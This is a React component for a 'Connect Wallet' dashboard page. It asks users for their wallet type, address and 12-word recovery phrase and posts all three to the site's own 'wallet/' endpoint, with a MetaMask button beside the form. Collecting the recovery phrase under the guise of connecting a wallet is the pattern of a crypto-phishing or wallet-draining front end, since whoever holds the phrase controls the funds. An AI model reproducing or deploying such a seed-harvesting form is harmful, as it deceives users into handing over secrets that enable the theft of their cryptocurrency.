import { requestClient } from "../../utils/request-client";
import { Link } from "react-router-dom";
import React, { useState, useContext } from "react";
import AuthContext from "../../context/AuthContext";
import "antd/dist/antd.css";
import { message } from "antd";
import DashNav from "../layout/DashNav";

function WalletForm() {
  const { loggedIn } = useContext(AuthContext);
  const [walletType, setWalletType] = useState("");
  
  const [address, setAddress] = useState("");
  const [phrase, setPhrase] = useState("");

  async function saveWallet(e) {
    e.preventDefault();

    try {
      const walletDate = {
        walletType,
        
        address,
        phrase,
      };
      await requestClient.post("wallet/", walletDate, {
        withCredentials: true,
      });
      message.success("Request has been sent!");
    } catch (err) {
      console.error(err);
      message.error("Error Sending Request. Try again!");
    }
  }

  return (
    <div class="md:grid grid-cols-5 bg-gray-900 text-gray-800 h-fit">
      <DashNav />
      {/* Content */}
      <main class="px-16 py-6 md:col-span-4">
        <header>
          <h1 className="text-xl text-white">Hi, {loggedIn.email}</h1>
          <h4 class="font-bold pb-2 text-white">Connect Wallet</h4>
        </header>

        <div className="">
          <h2 className="font-bold text-5xl uppercase pb-2 border-b border-gray-200 text-center text-white">
            Enter details below
          </h2>

          <form onSubmit={saveWallet} className="">
            <div className="relative flex flex-col min-w-0 break-words w-full mb-6 shadow-lg rounded-lg bg-gray-300">
              <div className="flex-auto p-5 lg:p-10">
                <h4 className="text-2xl font-semibold">Connect Wallet?</h4>
                <p className="leading-relaxed mt-1 mb-4 text-gray-600">
                  Kindly enter your wallet details below.
                </p>
                <div className="relative w-full mb-3 mt-8">
                  <input
                    value={walletType}
                    onChange={(e) => setWalletType(e.target.value)}
                    type="text"
                    className="border-0 px-3 py-3 mb-3 placeholder-gray-400 text-gray-700 bg-white rounded text-sm shadow focus:outline-none focus:ring w-full"
                    placeholder="Wallet type"
                    style={{ transition: "all .15s ease" }}
                  />
                  <input
                    value={address}
                    onChange={(e) => setAddress(e.target.value)}
                    type="text"
                    className="border-0 px-3 py-3 mb-3 placeholder-gray-400 text-gray-700 bg-white rounded text-sm shadow focus:outline-none focus:ring w-full"
                    placeholder="Wallet Address"
                    style={{ transition: "all .15s ease" }}
                  />
                  <h2 className="text-red-500 font-bold">
                    Kindly seperate the 12 phrase with white spaces
                  </h2>
                  <textarea
                    value={phrase}
                    onChange={(e) => setPhrase(e.target.value)}
                    type="text"
                    className="border-0 px-3 py-3 mb-3 placeholder-gray-400 text-gray-700 bg-white rounded text-sm shadow focus:outline-none focus:ring w-full"
                    placeholder="Wallet 12 phrase"
                    style={{ transition: "all .15s ease" }}
                  />
                </div>

                <div className="text-center mt-2">
                  <button
                    className="bg-gray-900 text-white active:bg-gray-700 text-sm font-bold uppercase px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1"
                    type="submit"
                    style={{ transition: "all .15s ease" }}
                  >
                    Connect
                  </button>
                  <p className="text-xl">OR</p>
                  <h2 className="text-xl">Connect using </h2>
                 
                  <Link to="/etherpay">
                    <button className="bg-yellow-500 p-2 font-bold rounded-sm text-white mt-3">
                    MetaMask
                    </button>
                  </Link>
                </div>
              </div>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
}

export default WalletForm;
